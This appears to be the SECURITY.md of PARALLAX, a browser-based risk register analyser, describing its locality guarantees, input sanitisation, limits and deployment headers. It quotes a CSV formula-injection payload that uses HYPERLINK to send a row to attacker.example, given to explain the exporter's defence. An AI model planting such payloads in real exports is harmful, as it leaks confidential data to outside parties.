# Security

A risk register is a list of an organisation's unmitigated weaknesses, with
owners' names against them and, increasingly, estimates of what each one would
cost. It is one of the more sensitive documents a company produces, and it
arrives here as a file one human was handed by another.

Two things follow. The register is treated as untrusted input, and it is never
sent anywhere.

---

## Reporting a vulnerability

Open a GitHub issue for anything that is not itself sensitive. For anything
that is, use GitHub's **private vulnerability reporting** on the repository's
Security tab.

**Please do not attach a real risk register to a report**, even a redacted one.
If a specific file triggers a bug, describe its *structure* — the column names,
the row count, which field held the value that broke — or reduce it to a
synthetic file that reproduces the same failure. The generator in
`scripts/make-fixtures.ts` shows the shape those look like.

---

## The locality claim, and how it is enforced

PARALLAX claims that a register never leaves the tab it is opened in. That
claim is enforced in three places rather than asserted in one.

**1. A Content Security Policy, in the document head.**

```
default-src 'none';
script-src 'self';
style-src 'self' 'unsafe-inline';
font-src 'self' data:;
img-src 'self' data:;
connect-src 'none';
form-action 'none';
base-uri 'none';
object-src 'none'
```

`connect-src 'none'` means the browser will refuse a `fetch`, an
`XMLHttpRequest`, a `WebSocket`, an `EventSource` and a `sendBeacon` — *even if
a future change tried to make one*. It is the browser enforcing the property,
not the README describing it.

`style-src 'unsafe-inline'` is required because the app sets computed inline
styles: an interval's position on a log axis, a histogram column's height, a
depth plane's offset. Those are numbers produced by the analysis, never text
taken from an imported file.

`frame-ancestors` is deliberately **absent**. A browser ignores it when it
arrives in a `meta` element, so claiming it there would be theatre. It belongs
in a response header — see *Deployment* below.

**2. A lint rule on the engine.** `src/engine/**` may not reference `fetch`,
`window`, `document` or `localStorage`. The engine is the layer that holds the
register; it has no business reaching for a network API, and the build fails if
it acquires one.

**3. A bundle scan in CI.** The built JavaScript is searched for network APIs.
Vite's modulepreload polyfill is the only thing it would otherwise inject that
contains a `fetch`, and it is disabled in `vite.config.ts` precisely so this
check stays meaningful.

### What is stored

One key, `parallax.theme`, holding the string `"dark"` or `"light"`.

No register, no analysis, no finding, no filename and no fragment of any of
them is written to `localStorage`, `sessionStorage`, IndexedDB, a cookie, or a
cache. Reloading the page discards everything. This is not a retention policy
that could be changed; there is no code that writes it.

### Telemetry

There is none. No analytics, no error reporting, no usage counter, no
font CDN — the fonts are bundled. The `ErrorBoundary` writes to the browser
console and nowhere else, and it reports an error's *type* and the first frame
of the component stack, never a value: a thrown error in a rendering path very
often carries the data that broke it.

---

## Untrusted input

Everything below is covered by tests in `src/engine/hostile.test.ts` and
`src/engine/csv.test.ts`, against the byte-exact fixtures in
`fixtures/malformed/`.

### CSV formula injection — the one that matters

A field that begins `=`, `+`, `-`, `@`, a tab or a carriage return is
interpreted as a **formula** when the exported CSV is opened in Excel,
LibreOffice or Google Sheets. A risk title of

```
=HYPERLINK("https://attacker.example/?"&A1,"Click for details")
```

becomes, on export, a link that exfiltrates a row of the register to a
stranger — using the victim's own spreadsheet as the delivery mechanism.

PARALLAX would be handing over the means to do that if its exporter did not
neutralise it. `escapeField` in `src/engine/csv.ts` prefixes a leading trigger
character with an apostrophe, which every major spreadsheet reads as "the rest
of this cell is text" and does not display. The order matters: the prefix is
applied **inside** the CSV quoting, because outside it the apostrophe would be
data rather than an escape and the formula would still run.

Tab and carriage return are included because Excel strips leading whitespace
before deciding, so `\t=cmd` is still a formula.

### Parsing

- **Unterminated quotes are refused**, not recovered from. Accepting one would
  read the rest of the file as a single enormous field and silently destroy the
  register.
- **A UTF-8 BOM is stripped** rather than becoming part of the first column
  name.
- **Ragged rows are padded or truncated and reported** — a register that is
  three columns ragged on row 900 is still worth auditing, but not silently.
- **Fields over 4,000 characters are truncated** with a warning.
- **Nested JSON values are flattened to text**, never evaluated.

### Resource limits

Hard caps in `src/engine/limits.ts`, chosen so a bad file produces a readable
error rather than a frozen tab:

| Limit | Value | Why |
|---|---|---|
| File size | 16 MB | A 20,000-row register with long descriptions is about 6 MB |
| Rows | 20,000 | Past this the pairwise analyses stop being interactive |
| Columns | 256 | A 300-column file is a spreadsheet grid, not a register |
| Field length | 4,000 chars | |
| Simulation iterations | 200,000 | So a slider cannot lock the tab |

The pairwise analyses would be O(n²) over rows. They are computed over **cells**
instead — every risk in a cell has identical levels, so the risk-pair counts
come from multiplying cell occupancies. A 5×5 matrix has 300 unordered cell
pairs no matter how many thousand risks are in it, which is why the pair counts
are exact rather than sampled.

Where a result list genuinely has to be bounded (inversion findings, example
indeterminate pairs), the truncation is **reported in the interface** alongside
the exact total, rather than silently changing what the number means.

### Rendering

React escapes text by default and nothing in this codebase uses
`dangerouslySetInnerHTML`. Imported values are rendered as text everywhere,
including in the SVG charts, where they appear as `<text>` content rather than
as attributes.

### Errors

`ImportError` carries a `message`, a `detail` and a `remedy`. `detail` may
quote the *structure* of an offending file — a column name, a row number, a
value's length — but never a field's contents. An error message is the easiest
place in a product for sensitive data to end up somewhere it was not meant to
go, and a test asserts that a secret placed in a malformed field does not
appear in the resulting error.

### Path handling

The browser build has no filesystem access; files arrive through `FileReader`
from a user gesture. The CLI reads exactly the path it is given and writes
exactly the path passed to `--out`. Neither constructs a path from a value
found *inside* a register, so there is no traversal surface.

---

## Determinism as a security property

Every simulated number comes from a seeded generator — `Math.random` is banned
in the engine by a lint rule. Two audits of the same file produce byte-identical
exports, and no export carries a timestamp.

This is a security property as much as a correctness one. It means an export
can be independently reproduced and compared: a figure quoted in a board paper
can be checked by anyone with the same file, and a diff between last quarter's
export and this one is a diff of the *register* rather than of the clock.

---

## Deployment

PARALLAX is a static bundle. If you host it, three response headers are worth
setting, none of which can be set from the document:

```
Content-Security-Policy: frame-ancestors 'none'
Referrer-Policy: no-referrer
Cross-Origin-Opener-Policy: same-origin
```

`frame-ancestors` is the one that matters: it is the clickjacking defence, and
it is the reason the meta-element policy in `index.html` deliberately does not
pretend to provide it.

Serve over HTTPS. The bundle contains no secrets and needs no configuration,
environment variables or build-time keys.

---

## Dependencies

Runtime: **React, React DOM, and three bundled font families.** That is the
entire list.

There is no charting library, no animation library, no CSV library, no
statistics library and no state management library. Every chart is hand-drawn
SVG, the CSV parser and the Monte Carlo engine are in this repository and
tested here, and the motion is CSS. That is a deliberate supply-chain position
for a tool that reads a document like this one: the smaller the dependency
graph, the less of it has to be trusted with your register.

The CLI has **no dependencies at all** — it runs the engine's TypeScript
sources directly under Node's native type stripping.
